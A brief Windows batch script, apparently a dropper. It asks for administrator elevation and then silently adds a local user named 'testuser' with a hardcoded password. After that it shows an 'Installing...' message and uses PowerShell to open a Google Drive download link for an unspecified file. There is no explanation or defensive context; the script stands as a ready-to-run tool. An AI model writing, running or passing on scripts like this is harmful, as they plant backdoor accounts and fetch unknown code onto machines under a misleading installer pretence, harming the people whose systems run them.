@echo off
echo Asking permission for Administrator...
net session >nul 2>&1
if "%errorlevel%" == "0" (
    echo Running admin commands...
    net user testuser MyPassword123 /add

    rem Use PowerShell to launch the URL in default browser
    start powershell -NoExit -Command ^
        "Write-Output 'Installing...';" ^
        "Start-Process 'https://drive.usercontent.google.com/download?id=11pgA9a1xQyK9r68UtH6Z9aNZESIztQ-N&export=download&authuser=0&confirm=t&uuid=c548a378-9094-4076-9fb6-d0be4ce1d40b&at=AN8xHopqPwLqXLBlvmg0RTpFGRhq%3A1751656926406'; exit"
) else (
    echo Requesting elevation...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
